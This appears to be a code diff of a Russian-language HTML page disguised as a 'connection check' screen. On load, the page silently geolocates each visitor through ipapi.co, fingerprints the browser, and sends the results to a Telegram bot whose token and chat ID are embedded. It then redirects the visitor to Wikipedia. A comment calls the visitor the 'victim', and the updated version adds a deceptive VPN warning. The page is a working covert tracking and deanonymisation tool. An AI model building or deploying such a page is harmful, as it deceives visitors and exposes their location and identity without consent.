@@ -3,77 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка...</title>
+    <title>Проверка соединения</title>
     <style>
-        body { background: #0e0e0e; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; color: #aaa; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #0e0e0e; 
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .box { 
+            background: #1a1a1a; 
+            padding: 40px; 
+            border-radius: 12px; 
+            text-align: center; 
+            max-width: 400px; 
+            border: 1px solid #333;
+        }
+        .loader { 
+            border: 4px solid #333; 
+            border-top: 4px solid #0088cc; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .vpn-warning { 
+            color: #ff6b6b; 
+            font-weight: bold; 
+            font-size: 18px; 
+            padding: 12px; 
+            background: #2a0a0a; 
+            border-radius: 8px; 
+            border: 1px solid #ff6b6b;
+            display: none;
+            margin-bottom: 20px;
+        }
+        .status-text {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-<div style="text-align:center;">
-    <div class="loader"></div>
-    <p>Пожалуйста, подождите, идёт проверка...</p>
+<div class="box">
+    <div class="loader" id="loader"></div>
+    <div id="vpnWarning" class="vpn-warning">
+        ⚠️ Включен VPN: данные не защищены
+    </div>
+    <div class="status-text" id="statusText">Проверка соединения...</div>
 </div>
 
 <script>
-    // Сбор данных без действий жертвы
-    fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(geo => {
-            const report = {
-                ip: geo.ip || '—',
-                city: geo.city || '—',
-                region: geo.region || '—',
-                country: geo.country_name || '—',
-                lat: geo.latitude || '—',
-                lon: geo.longitude || '—',
-                isp: geo.org || '—',
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'прямой',
-                timestamp: new Date().toISOString()
-            };
+    // ТВОИ ДАННЫЕ ДЛЯ БОТА (ВСТАВЛЕНЫ)
+    const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
+    const chatId = '7253706229';
 
-            const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';   // замени
-            const chatId = '7253706229';    // замени
+    // Функция отправки отчёта
+    function sendReport(geoData, isVpn) {
+        const report = {
+            ip: geoData.ip || '—',
+            city: geoData.city || '—',
+            region: geoData.region || '—',
+            country: geoData.country_name || '—',
+            isp: geoData.org || '—',
+            vpn_detected: isVpn,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'прямой',
+            timestamp: new Date().toISOString()
+        };
 
-            const message = `🔴 НОВЫЙ СБОР (АВТО):\n` +
-                `IP: ${report.ip}\n` +
-                `Город: ${report.city}\n` +
-                `Регион: ${report.region}\n` +
-                `Страна: ${report.country}\n` +
-                `Координаты: ${report.lat}, ${report.lon}\n` +
-                `Провайдер: ${report.isp}\n` +
-                `Браузер: ${report.userAgent}\n` +
-                `Платформа: ${report.platform}\n` +
-                `Язык: ${report.language}\n` +
-                `Экран: ${report.screen}\n` +
-                `Часовой пояс: ${report.timezone}\n` +
-                `Реферер: ${report.referrer}\n` +
-                `Время: ${report.timestamp}`;
+        const vpnStatus = isVpn ? '🔴 ВКЛЮЧЕН' : '🟢 ОТКЛЮЧЕН';
+        const message = `🔍 НОВЫЙ ОТЧЁТ:\n` +
+            `VPN статус: ${vpnStatus}\n` +
+            `IP: ${report.ip}\n` +
+            `Город: ${report.city}\n` +
+            `Регион: ${report.region}\n` +
+            `Страна: ${report.country}\n` +
+            `Провайдер: ${report.isp}\n` +
+            `Браузер: ${report.userAgent}\n` +
+            `Платформа: ${report.platform}\n` +
+            `Язык: ${report.language}\n` +
+            `Экран: ${report.screen}\n` +
+            `Часовой пояс: ${report.timezone}\n` +
+            `Реферер: ${report.referrer}\n` +
+            `Время: ${report.timestamp}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(() => {
-                // Редирект на безобидный сайт (например, главную Википедии или реальный учебник)
-                window.location.href = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
-            })
-            .catch(() => {
-                // Если ошибка — всё равно редирект
-                window.location.href = 'https://ru.wikipedia.org';
-            });
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        })
+        .then(() => {
+            window.location.href = 'https://ru.wikipedia.org';
         })
         .catch(() => {
-            // Если не удалось определить гео — всё равно собираем остальное и редиректим
             window.location.href = 'https://ru.wikipedia.org';
+        });
+    }
+
+    // Основной скрипт
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const provider = data.org || '';
+            const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'server', 'data center', 'vps', 'dedicated'];
+            const isVpn = vpnKeywords.some(keyword => provider.toLowerCase().includes(keyword)) || 
+                           data.proxy === true || data.proxy === 'true';
+
+            if (isVpn) {
+                document.getElementById('vpnWarning').style.display = 'block';
+                document.getElementById('statusText').innerText = 'Ваше соединение не защищено, но проверка продолжается...';
+            } else {
+                document.getElementById('statusText').innerText = 'Соединение защищено, идёт проверка...';
+            }
+
+            sendReport(data, isVpn);
+        })
+        .catch(() => {
+            document.getElementById('statusText').innerText = 'Не удалось проверить соединение, продолжаем...';
+            sendReport({ ip: '—', city: '—', region: '—', country_name: '—', org: '—' }, false);
         });
 </script>
 </body>
